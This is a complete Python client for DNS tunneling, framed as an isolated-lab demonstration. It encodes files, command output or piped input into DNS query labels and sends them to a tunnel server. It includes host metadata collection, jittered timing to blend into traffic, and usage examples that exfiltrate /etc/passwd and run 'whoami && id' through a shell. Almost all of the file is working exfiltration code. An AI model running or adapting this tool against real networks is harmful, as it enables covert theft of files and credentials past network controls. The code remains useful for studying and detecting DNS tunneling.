#!/usr/bin/env python3
"""
DNS Tunneling Lab - Client Component
======================================
Demonstrates how an attacker encodes data into DNS queries to bypass
network controls. Designed exclusively for isolated lab environments.

Encoding Strategy:
  - Data is hex-encoded and split across DNS subdomain labels
  - Each label ≤ 63 chars, total FQDN ≤ 253 chars
  - Session-based chunking with sequence numbers for reassembly

Usage:
  python3 dns_tunnel_client.py --server 192.168.1.100 --domain tunnel.lab.local \
      --mode exfil --file /etc/passwd

  python3 dns_tunnel_client.py --server 192.168.1.100 --domain tunnel.lab.local \
      --mode shell
"""

import argparse
import base64
import getpass
import json
import logging
import os
import random
import re
import socket
import string
import struct
import subprocess
import sys
import time
import threading
from datetime import datetime

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("dns_tunnel_client")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
MAX_LABEL_LEN   = 40   # conservative (DNS max is 63)
MAX_FQDN_LEN    = 253
CHUNK_RETRY     = 3
RETRY_DELAY     = 1.5   # seconds between retries
POLL_INTERVAL   = 2.0   # seconds between POLL queries
DNS_TIMEOUT     = 3     # socket timeout


# ---------------------------------------------------------------------------
# DNS Low-Level Helpers
# ---------------------------------------------------------------------------
def encode_dns_name(name: str) -> bytes:
    buf = b""
    for label in name.rstrip(".").split("."):
        enc = label.encode("ascii")
        buf += bytes([len(enc)]) + enc
    buf += b"\x00"
    return buf


def parse_dns_name(data: bytes, offset: int) -> tuple[str, int]:
    labels = []
    visited = set()
    while True:
        if offset in visited:
            raise ValueError("loop")
        visited.add(offset)
        length = data[offset]
        if length == 0:
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            suffix, _ = parse_dns_name(data, ptr)
            labels.append(suffix)
            offset += 2
            break
        else:
            offset += 1
            labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
            offset += length
    return ".".join(labels), offset


def parse_txt_response(raw: bytes) -> str | None:
    """Extract the first TXT RDATA string from a DNS response."""
    try:
        ancount = struct.unpack("!H", raw[6:8])[0]
        if ancount == 0:
            return None
        offset = 12
        # Skip question
        _, offset = parse_dns_name(raw, offset)
        offset += 4  # qtype + qclass
        # Read first answer
        _, offset = parse_dns_name(raw, offset)
        rtype, _, _, rdlen = struct.unpack("!HHiH", raw[offset:offset + 10])
        offset += 10
        if rtype == 16:  # TXT
            txt_len = raw[offset]
            return raw[offset + 1: offset + 1 + txt_len].decode("ascii", errors="replace")
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Tunnel Protocol Encoder
# ---------------------------------------------------------------------------
def hex_encode(data: bytes) -> str:
    return data.hex()


def chunk_data(data: bytes, chunk_bytes: int) -> list[bytes]:
    return [data[i:i + chunk_bytes] for i in range(0, len(data), chunk_bytes)]


def build_tunnel_fqdn(msg_type: str, session_id: str, seq: int,
                       total: int, payload_hex: str, domain: str) -> str:
    """
    Build a tunnel FQDN:
      <type>.<session>.<seq>.<total>.<data_hex>.<domain>
    Splits data_hex into ≤MAX_LABEL_LEN char labels.
    """
    data_labels = [payload_hex[i:i + MAX_LABEL_LEN]
                   for i in range(0, len(payload_hex), MAX_LABEL_LEN)]
    parts = [msg_type, session_id, str(seq), str(total)] + data_labels
    return ".".join(parts) + "." + domain


def calc_max_data_bytes(msg_type: str, session_id: str, total: int,
                         seq: int, domain: str) -> int:
    """Calculate the maximum raw data bytes that fit in one DNS query."""
    overhead = len(f"{msg_type}.{session_id}.{seq}.{total}.") + len(domain) + 1
    available_chars = MAX_FQDN_LEN - overhead - 10   # safety margin
    # account for dot separators between labels
    labels = available_chars // (MAX_LABEL_LEN + 1)
    hex_chars = labels * MAX_LABEL_LEN
    return hex_chars // 2   # hex → bytes


# ---------------------------------------------------------------------------
# DNS Socket Sender
# ---------------------------------------------------------------------------
class DNSClient:
    def __init__(self, server_ip: str, port: int = 53):
        self.server_ip = server_ip
        self.port = port

    def query_txt(self, fqdn: str) -> str | None:
        """Send a DNS TXT query and return TXT value or None."""
        txid = random.randint(0, 65535)
        # Build query packet
        header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
        question = encode_dns_name(fqdn) + struct.pack("!HH", 16, 1)  # TXT IN
        packet = header + question

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(DNS_TIMEOUT)
        try:
            sock.sendto(packet, (self.server_ip, self.port))
            resp, _ = sock.recvfrom(512)
            return parse_txt_response(resp)
        except socket.timeout:
            return None
        except Exception as e:
            log.debug(f"DNS send error: {e}")
            return None
        finally:
            sock.close()


# ---------------------------------------------------------------------------
# Session Manager
# ---------------------------------------------------------------------------
def generate_session_id(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


class TunnelClient:
    def __init__(self, server_ip: str, domain: str, port: int = 53,
                 delay: float = 0.1, jitter: float = 0.05, verbose: bool = False):
        self.dns = DNSClient(server_ip, port)
        self.domain = domain
        self.delay = delay
        self.jitter = jitter
        self.session_id = generate_session_id()
        self.verbose = verbose
        if verbose:
            log.setLevel(logging.DEBUG)

    # ------------------------------------------------------------------
    # Session Initialization
    # ------------------------------------------------------------------
    def init_session(self, metadata: dict | None = None) -> bool:
        meta = metadata or {}
        meta.setdefault("hostname", socket.gethostname())
        meta.setdefault("user", getpass.getuser())
        meta.setdefault("pid", os.getpid())
        meta.setdefault("ts", datetime.utcnow().isoformat())

        meta_json = json.dumps(meta)
        meta_hex = hex_encode(meta_json.encode())
        fqdn = build_tunnel_fqdn("INIT", self.session_id, 0, 0, meta_hex, self.domain)

        log.info(f"Initializing session: {self.session_id}")
        log.debug(f"INIT query: {fqdn}")

        for attempt in range(CHUNK_RETRY):
            resp = self.dns.query_txt(fqdn)
            if resp and resp.startswith("ACK:"):
                log.info(f"Session established. Server ACK: {resp}")
                return True
            log.warning(f"INIT attempt {attempt+1} failed (resp={resp})")
            time.sleep(RETRY_DELAY)
        return False

    # ------------------------------------------------------------------
    # Data Exfiltration
    # ------------------------------------------------------------------
    def send_data(self, data: bytes) -> bool:
        """Split data into chunks and send each as a DNS query."""
        # Calculate chunk size
        chunk_bytes = calc_max_data_bytes("DATA", self.session_id, 999, 999, self.domain)
        chunk_bytes = max(4, chunk_bytes)
        chunks = chunk_data(data, chunk_bytes)
        total = len(chunks)

        log.info(f"Sending {len(data)} bytes in {total} DNS chunks "
                 f"(~{chunk_bytes} bytes/chunk)")

        for i, chunk in enumerate(chunks):
            msg_type = "FIN" if i == total - 1 else "DATA"
            chunk_hex = hex_encode(chunk)
            fqdn = build_tunnel_fqdn(msg_type, self.session_id, i, total,
                                     chunk_hex, self.domain)

            log.debug(f"[{i+1}/{total}] {msg_type} fqdn={fqdn[:80]}…")

            success = False
            for attempt in range(CHUNK_RETRY):
                resp = self.dns.query_txt(fqdn)
                if resp and (resp.startswith("OK:") or resp.startswith("OK:FIN:")):
                    success = True
                    break
                log.warning(f"  Chunk {i} attempt {attempt+1} failed (resp={resp})")
                time.sleep(RETRY_DELAY)

            if not success:
                log.error(f"Failed to send chunk {i} after {CHUNK_RETRY} attempts")
                return False

            # Jittered delay to simulate real traffic
            sleep_time = self.delay + random.uniform(-self.jitter, self.jitter)
            time.sleep(max(0.01, sleep_time))

        log.info("All chunks sent successfully.")
        return True

    # ------------------------------------------------------------------
    # Polling (server → client)
    # ------------------------------------------------------------------
    def poll_response(self) -> str | None:
        """Ask server if it has data to send back."""
        fqdn = build_tunnel_fqdn("POLL", self.session_id, 0, 0, "", self.domain)
        resp = self.dns.query_txt(fqdn)
        if resp and resp.startswith("DATA:"):
            return resp[5:]
        return None

    # ------------------------------------------------------------------
    # High-level modes
    # ------------------------------------------------------------------
    def exfil_file(self, filepath: str) -> bool:
        """Exfiltrate a file over DNS."""
        if not os.path.exists(filepath):
            log.error(f"File not found: {filepath}")
            return False

        with open(filepath, "rb") as f:
            data = f.read()

        log.info(f"Exfiltrating: {filepath} ({len(data)} bytes)")
        meta = {"mode": "file", "filename": os.path.basename(filepath),
                "size": len(data)}

        if not self.init_session(meta):
            return False
        return self.send_data(data)

    def exfil_command_output(self, command: str) -> bool:
        """Run a command and exfiltrate its output over DNS."""
        log.info(f"Running: {command}")
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=30
            )
            output = f"CMD: {command}\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
        except subprocess.TimeoutExpired:
            output = f"CMD: {command}\nERROR: timeout"

        data = output.encode("utf-8")
        meta = {"mode": "cmd", "command": command, "size": len(data)}

        if not self.init_session(meta):
            return False
        return self.send_data(data)

    def interactive_shell(self):
        """
        Simulated reverse shell over DNS.
        Client sends command output; polls for new commands.
        NOTE: For demonstration – no actual shell spawned.
        """
        log.info("Starting simulated DNS shell (DEMO MODE)")
        meta = {"mode": "shell"}
        if not self.init_session(meta):
            return

        print("\n[DNS Shell Demo]  Type commands to send their output.")
        print("Type 'exit' to quit.\n")

        while True:
            cmd = input("cmd> ").strip()
            if cmd.lower() in ("exit", "quit"):
                break
            if not cmd:
                continue
            self.exfil_command_output(cmd)
            # Poll for server response
            time.sleep(POLL_INTERVAL)
            resp = self.poll_response()
            if resp:
                print(f"[Server]: {resp}")

    def exfil_stdin(self) -> bool:
        """Read from stdin and exfiltrate."""
        log.info("Reading from stdin (pipe mode)…")
        data = sys.stdin.buffer.read()
        meta = {"mode": "stdin", "size": len(data)}
        if not self.init_session(meta):
            return False
        return self.send_data(data)


# ---------------------------------------------------------------------------
# Entry Point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="DNS Tunnel Client – Lab Demonstration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Exfiltrate a file
  python3 dns_tunnel_client.py --server 10.0.0.1 --domain tunnel.lab.local \\
      --mode exfil --file /etc/passwd

  # Exfiltrate command output
  python3 dns_tunnel_client.py --server 10.0.0.1 --domain tunnel.lab.local \\
      --mode cmd --command "whoami && id"

  # Pipe mode
  cat /etc/hosts | python3 dns_tunnel_client.py --server 10.0.0.1 \\
      --domain tunnel.lab.local --mode stdin

  # Interactive demo shell
  python3 dns_tunnel_client.py --server 10.0.0.1 --domain tunnel.lab.local \\
      --mode shell
""",
    )
    parser.add_argument("--server",  required=True, help="DNS tunnel server IP")
    parser.add_argument("--domain",  default="tunnel.lab.local",
                        help="Tunnel domain (default: tunnel.lab.local)")
    parser.add_argument("--port",    type=int, default=53,
                        help="Server DNS port (default: 53)")
    parser.add_argument("--mode",    choices=["exfil", "cmd", "stdin", "shell"],
                        default="exfil", help="Tunnel mode")
    parser.add_argument("--file",    help="File to exfiltrate (--mode exfil)")
    parser.add_argument("--command", help='Command to run (--mode cmd)')
    parser.add_argument("--delay",   type=float, default=0.1,
                        help="Delay between DNS queries in seconds (default: 0.1)")
    parser.add_argument("--jitter",  type=float, default=0.05,
                        help="Random jitter added to delay (default: 0.05)")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    client = TunnelClient(args.server, args.domain, args.port,
                          args.delay, args.jitter, args.verbose)

    if args.mode == "exfil":
        if not args.file:
            parser.error("--file required for --mode exfil")
        sys.exit(0 if client.exfil_file(args.file) else 1)

    elif args.mode == "cmd":
        if not args.command:
            parser.error("--command required for --mode cmd")
        sys.exit(0 if client.exfil_command_output(args.command) else 1)

    elif args.mode == "stdin":
        sys.exit(0 if client.exfil_stdin() else 1)

    elif args.mode == "shell":
        client.interactive_shell()


if __name__ == "__main__":
    main()
